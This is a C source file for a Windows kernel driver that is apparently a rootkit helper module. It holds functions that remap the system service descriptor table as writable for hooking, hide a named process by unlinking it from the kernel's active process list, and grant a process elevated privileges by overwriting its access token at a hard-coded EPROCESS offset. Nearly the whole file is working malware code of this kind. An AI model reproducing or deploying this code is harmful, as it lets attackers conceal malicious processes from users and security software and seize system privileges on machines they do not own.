#include "helpers.h"

PVOID MappedSystemCallTable;
PMDL pmdlSystemCall;
CSHORT pmdlOldFlags;
NTSTATUS HlpUnprotectSSDT()
{
	pmdlSystemCall = MmCreateMdl(0,
		KeServiceDescriptorTable.ServiceTableBase,
		KeServiceDescriptorTable.NumberOfServices * 4);
	if (!pmdlSystemCall) return STATUS_UNSUCCESSFUL;

	MmBuildMdlForNonPagedPool(pmdlSystemCall);
	pmdlOldFlags = pmdlSystemCall->MdlFlags;
	pmdlSystemCall->MdlFlags |= MDL_MAPPED_TO_SYSTEM_VA;
	MappedSystemCallTable = MmMapLockedPages(pmdlSystemCall, KernelMode);

	return STATUS_SUCCESS;
}

ULONG ProcessNameOffset;
ULONG HlpGetProcNameOffset()
{
	PEPROCESS       curproc;
	int             i;
	curproc = IoGetCurrentProcess();
	for( i = 0; i < 3*PAGE_SIZE; i++ ) {
		if( !strncmp( SYSNAME, (PCHAR) curproc + i, strlen(SYSNAME) )) {
			ProcessNameOffset = i; return i;
		}
	}
	return 0;
}

void HlpGetCurrProcName(char *Name)
{
	PEPROCESS       curproc;
	char            *nameptr;
	ULONG           i;
	if( ProcessNameOffset ) {
		curproc = IoGetCurrentProcess();
		nameptr   = (PCHAR) curproc + ProcessNameOffset;
		if (Name != 0) strncpy( Name, nameptr, 16 );
	} else {
		strcpy( Name, "???");
	}
}

PEPROCESS HlpFindProcess(char *name, ULONG sz)
{
	PEPROCESS StartProc, CurrProc;
	PLIST_ENTRY list;
	StartProc = IoGetCurrentProcess();
	CurrProc = StartProc;

	do
	{
		if (strncmp(name, (PCHAR)CurrProc + ProcessNameOffset, sz) == 0)
			return CurrProc;
		list = (PLIST_ENTRY)((PUCHAR)CurrProc + 0x0b8); //ActiveProcessLinks
		CurrProc = (PEPROCESS)list->Flink;
		CurrProc = (PEPROCESS)((PUCHAR)CurrProc - 0x0b8);
	} while (StartProc != CurrProc);

	return 0;
}

PLIST_ENTRY HlpHideProcess(char *name, ULONG sz)
{
	PEPROCESS hideProc;
	PLIST_ENTRY prev, list, next;

	hideProc = HlpFindProcess(name, sz);
	if (hideProc == 0) return 0;

	list = (PLIST_ENTRY)((PUCHAR)hideProc + 0x0b8);
	prev = list->Blink; next = list->Flink;
	prev->Flink = next; next->Blink = prev;

	return list;
}

void HlpRestoreProcess(PLIST_ENTRY list)
{
	if (list == 0) return;
	PLIST_ENTRY prev, next;
	prev = list->Blink; next = list->Flink;
	prev->Flink = list; next->Blink = list;
}

HLPPROCTOKEN HlpGetCurrProcToken()
{
	PEPROCESS proc = IoGetCurrentProcess();
	HLPPROCTOKEN token; token.lo = 0; token.hi = 0;
	RtlCopyMemory(&token, (PUCHAR)proc+0x0f8, sizeof(HLPPROCTOKEN));
	token.lo &= 0xFFFFFFF0;
	return token;
}

HLPPROCTOKEN HlpElevateProcess(char *name, ULONG sz, HLPPROCTOKEN *elvTo)
{
	PEPROCESS proc;
	PLIST_ENTRY prev, list, next;
	HLPPROCTOKEN oldToken; oldToken.lo = 0; oldToken.hi = 0;

	proc = HlpFindProcess(name, sz);
	if (proc == 0) return oldToken;

	RtlCopyMemory(&oldToken, (PUCHAR)proc+0x0f8, sizeof(HLPPROCTOKEN));
	oldToken.lo &= 0xFFFFFFF0;
	RtlCopyMemory((PUCHAR)proc+0x0f8, elvTo, sizeof(HLPPROCTOKEN));

	return oldToken;
}

responseInfo *responseInfosFirst = 0;
void HlpAddResponse(responseInfo *pRespInfo)
{
	pRespInfo->next = 0;

	if (responseInfosFirst == 0)
		responseInfosFirst = pRespInfo;
	else
	{
		responseInfo *curr = responseInfosFirst;
		while (curr->next != 0)
			curr = (responseInfo*)curr->next;
		if (curr->next == 0)
			curr->next = pRespInfo;
	}
}
responseInfo* HlpFindResponse(ULONG check)
{
	if (responseInfosFirst == 0) return 0;

	responseInfo *curr = responseInfosFirst;
	while (curr != 0)
	{
		if (curr->check == check) return curr;
		curr = (responseInfo*)curr->next;
	}

	return 0;
}
